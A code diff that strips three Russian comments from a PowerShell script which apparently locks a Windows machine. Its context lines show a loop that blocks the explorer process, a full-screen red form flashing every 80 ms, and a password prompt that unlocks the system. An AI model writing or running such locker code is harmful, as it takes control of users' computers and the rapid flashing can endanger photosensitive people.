@@ -4,7 +4,6 @@ Add-Type -AssemblyName PresentationFramework
 
 $global:Unlocked = $false
 
-# Блокировщик Explorer
 $BlockExplorerJob = {
     while ($true) {
         $explorer = Get-Process -Name "explorer" -ErrorAction SilentlyContinue
@@ -46,7 +45,6 @@ function Show-RedFlashingScreen {
         $spaceLabel.Top = $form.ClientSize.Height - 80
     })
 
-    # Быстрое мигание
     $timer = New-Object System.Windows.Forms.Timer
     $timer.Interval = 80
     $isRed = $true
@@ -174,7 +172,6 @@ function Show-PasswordWindow {
     $form.ShowDialog() | Out-Null
 }
 
-# Запуск
 Show-RedFlashingScreen
 Show-PasswordWindow
 
